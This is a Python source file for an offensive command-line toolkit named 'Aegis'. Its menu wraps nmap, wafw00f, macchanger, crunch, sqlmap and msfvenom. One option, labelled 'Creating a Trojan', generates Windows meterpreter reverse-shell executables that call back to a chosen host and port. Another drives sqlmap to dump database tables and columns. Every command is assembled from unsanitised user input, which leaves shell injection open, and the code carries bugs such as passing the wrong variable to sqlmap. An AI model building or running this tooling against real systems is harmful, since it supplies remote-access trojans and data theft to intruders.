from colorama import Fore, Style, init
import socket
import os
from datetime import datetime
from scapy.all import *
import py_compile
import sys
import subprocess
init(autoreset=True)
def displaymenu():
    banner = f"""
        
        {Fore.RED}                       010101001010110101101010101010101001010111010
        {Fore.RED}              010100110010100010100101010000000001001010100010010100010100100
        {Fore.RED}             010101010010101001001011010101010101010100101010101011000110100101
        {Fore.RED}                0100101011010101011111010101001001101011011111101010101001001
        {Fore.RED}             0101001010010100101000101010100010010101010101010101001111010001
        {Fore.RED}             01101010101011101111110101010100001100101010011010101101101010100
        {Fore.RED}                011010101010111011111101010101000011001010100110101011011010
        {Fore.RED}             1101010101011101111110101010101001010010100101001101010110110101010
        {Fore.RED}             0100               010101010011010101111010101010              0010    
        {Fore.RED}             0100                      01010100101011001                    0010
        {Fore.RED}             1001                         0100101101                        0101
        {Fore.RED}             1001                       11010110100010                      1101 
        {Fore.RED}             10010                     010101001010010                     10010
        {Fore.RED}             001001010              0010010        0101011             100101011
        {Fore.RED}             10101001010110010101111011000          0010101010111010100010101001
        {Fore.RED}                 0101010101010101100101010          010101010101011100101010
        {Fore.RED}                     110101000101010001101          110101000101010001101 
        {Fore.RED}                     1101010001010100011010        0110101000101010001101
        {Fore.RED}                              01010101010100  00  0010101001010
        {Fore.RED}                             010101010101010101101010010101001100
        {Fore.RED}                             101010101010101010101010101001011000
        {Fore.RED}                                      0120101001010110101
        {Fore.RED}                                          0101001001010
        {Fore.RED}                                            01010100                              v1.2.0-stable
        
        {Fore.GREEN}                                     ■ Welcome to Aegis ■       
        {Fore.RED}          _____________________________________________________________________________                                             
        {Fore.WHITE}          "Hackers are not just people who break into systems. Hacking is a mindset."
        
        {Fore.GREEN}                                                                      'Kevin Mitnick'
        {Fore.RED}          _____________________________________________________________________________
        
    {Fore.WHITE}[{Fore.RED}q{Fore.WHITE}]{Fore.CYAN} Exit the Tool
    {Fore.WHITE}[{Fore.RED}h{Fore.WHITE}]{Fore.GREEN} Help Menu  {Fore.RED}      
{Fore.WHITE}    [{Fore.RED}1{Fore.WHITE}] Port Scanner                                [{Fore.RED}6{Fore.WHITE}] Change MAC Address
{Fore.WHITE}    [{Fore.RED}2{Fore.WHITE}] Firewall Detection                          [{Fore.RED}7{Fore.WHITE}] Database Control
{Fore.WHITE}    [{Fore.RED}3{Fore.WHITE}] Operating System Information                [{Fore.RED}8{Fore.WHITE}] Create a Custom Wordlist 
{Fore.WHITE}    [{Fore.RED}4{Fore.WHITE}] VPN Check                                   [{Fore.RED}9{Fore.WHITE}] Compiler Program 
{Fore.WHITE}    [{Fore.RED}5{Fore.WHITE}] Creating a Trojan                           [{Fore.RED}10{Fore.WHITE}] Create Text File 
    """
    print(banner)

def show_helpmenu():
    help = f"""  {Fore.WHITE} 
    Aegis - Help Menu
    [h] To view the help menu.
    [q] To exit the tool.
    [1] Select the Port Scanner option, enter the target IP address, and start the scan. 
    [2] With Wafw00f tool, you can detect firewalls. Enter an address to identify the target's firewall.
    [3] With Nmap tool, operating system information. 
    [4] The ike-scan tool allows you to check for VPNs on an IP address. Simply provide the target IP, and it will perform the scan.
    [5] Msfvenom is a Metasploit tool used to generate malicious payloads for offensive purposes. 
        It can create Trojans for various platforms. However, it is crucial to use this tool only for ethical hacking and security testing purposes.
    [6] This module allows you to change the MAC address either randomly or manually. Additionally, it provides the option to revert to the original MAC address at any time. 
        This feature is useful for network security or privacy purposes.
    [7] This module allows you to take control of the database based on known data with tools like sqlmap. 
        It contains 4 modules: database name, column name, table name, and link.
    [8] This module allows you to create a wordlist with the desired features. To use it, simply enter the required information.
    [9] This module compiles the file you enter and saves it. Through the compilation process, you can hide the code of the file and review its contents.
    [10] This module allows you to instantly create a text file whenever you need one while using the tools.
    """
    print(help)

def savefile(content):
    save_choice = input(f"{Fore.WHITE}Do you want to save the result to a file? (Y/n): ").lower()
    if save_choice == "y":
        save_path = input(f"{Fore.WHITE}Enter the full path to save the file, or press Enter to save on Desktop: ")
        if not save_path.strip():  
            save_path = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.exists(save_path):  
            os.makedirs(save_path)
        filename = f"aegis_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join(save_path, filename)
        with open(filepath, "w") as file:
            file.write(str(content))
        print(f"{Fore.GREEN}Results saved to {filepath}")
    else:
        print(f"{Fore.RED}Results were not saved.")


def create_and_open_txt():
    filename = "aegis.txt"
    with open(filename, 'w') as f:
        f.write("AEGIS TOOL 10 .\n")
    print(f"{filename} The file has been created.")
    choice = input("Would you like to open the file? (Y/n): ").lower()
    
    if choice == "yes" or choice == "Yes" or choice == "YES" or choice == "y" or choice == "Y":       
        os.system(f'nano {filename}')
    else:
        print("The file was not opened.")

while True:
    displaymenu()
    selection = input(f"{Fore.WHITE}Please select an option => ")
    if (selection == "1"):
        target = input(f"{Fore.WHITE}Please enter the target IP address => ")
        if target:
            print(f"Scanning target: {target}")
            result = os.system("nmap -sS -sV " + target)
            savefile(result)
    elif selection == "2":
        ad = input(f"{Fore.WHITE}Select Address => ")
        result = os.system("wafw00f " + ad)
        savefile(result)
    elif selection == "3":
        hedef = input(f"{Fore.WHITE}Please enter the target IP address => ")
        result = os.system("nmap -O " + hedef)
        savefile(result)
    elif selection == "4":
        hedef = input(f"{Fore.WHITE}Please enter the target IP address => ")
        result = os.system("ike-scan " + hedef)
    elif selection == "5":
        ip = input(f"{Fore.WHITE}Enter a local or external IP address => ")
        desktop_path = os.path.join("/home/kali", "Desktop")  # Desktop yolunu belirliyoruz
        port = input("Enter a port => ")
    
        print(f"""{Fore.RED}
              Payloads list
        {Fore.WHITE}          
        [1] windows/meterpreter/reverse_tcp
        [2] windows/meterpreter/reverse_http
        [3] windows/meterpreter/reverse_https       
    """)

        payload = input(f"{Fore.WHITE}Enter the payload number => ")

        filename = input("Enter the filename (without extension) => ")
        savefilee = os.path.join(desktop_path, filename + ".exe")

        if payload == "1":
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {savefilee}")
        elif payload == "2":
            os.system(f"msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} -f exe -o {savefilee}")
        elif payload == "3":
            os.system(f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe -o {savefilee}")
        else:
            print(f"{Fore.RED}Invalid selection. Please select a valid payload number.")

    elif selection == "6":
        print(f"""{Fore.RED}
        [1] Set the MAC address randomly.
        [2] Set the MAC address manually.
        [3] Revert to the original MAC address.       
        """)
        select = input("How would you like to set it? => ")
        if (select == "1"):
            os.system("ifconfig eth0 down")
            os.system("macchanger -r eth0")
            os.system("ifconfig eth0 up")
            print(f"{Fore.RED}The MAC address has been changed randomly.")
        elif select == "2":
            mac = input("Enter the new MAC address => ")
            os.system("ifconfig eth0 down")
            os.system("macchanger --mac " + mac + " eth0")
            os.system("ifconfig eth0 up")
            print(f"{Fore.RED}The new MAC address has been set manually.")
        elif select == "3":
            os.system("ifconfig eth0 down")
            os.system("macchanger -p eth0")
            os.system("ifconfig eth0 up")
            print(f"{Fore.RED}The MAC address has reverted to the original.")
    elif selection == "7":
        print(f"""{Fore.WHITE}
        [1] With just the link
        [2] With the link and database name
        [3] With the link, database name, and table name
        [4] With the link, database name, table name, and column name      
        """)
        sss = input("How would you like to set it? => ")
        if (sss == "1"):
            link = input("Enter the link => ")
            os.system("sqlmap -u " + sss + " --dbs --random-agent")
        elif sss == "2":
            link1 = input("Enter the link => ")
            db = input("Enter the database name => ")
            os.system("sqlmap -u " + link1 + " -D " + db + " --tables --random-agent")
        elif sss == "3":
            link2 = input("Enter the link => ")
            db2 = input("Enter the database name => ")
            tb = input("Enter the table name => ")
            os.system("sqlmap -u " + link2 + " -D " + db2 + " -T " + tb + " --columns --random-agent")
        elif sss == "4":
            link3 = input("Enter the link => ")
            db3 = input("Enter the database name => ")
            tb2 = input("Enter the table name => ")
            cl = input("Enter the column name => ")
            os.system("sqlmap -u " + link3 + " -D " + db3 + " -T " + tb2 + " -C " + cl + " --dump --random-agent") 
    elif selection == "8":
        minc = input("Enter the minimum number of characters => ")
        maxc = input("Enter the maximum number of characters => ")
        character = input("Enter the character to be used => ")
        save = input("Enter the location to be saved => ")
        os.system("crunch " + minc + " " + maxc + " " + character + " -o " + save)
        print(f"{Fore.GREEN}The operation was completed successfully!")
    elif selection == "9":
        dr = input("Enter the program name => ")
        py_compile.compile(dr)
    elif selection == "10":
        create_and_open_txt()   
    elif selection == "h" or selection == "H":
        show_helpmenu()   
    elif selection == "q" or selection == "Q":
        print(f"{Fore.RED}Exiting NetHawk...")
        break
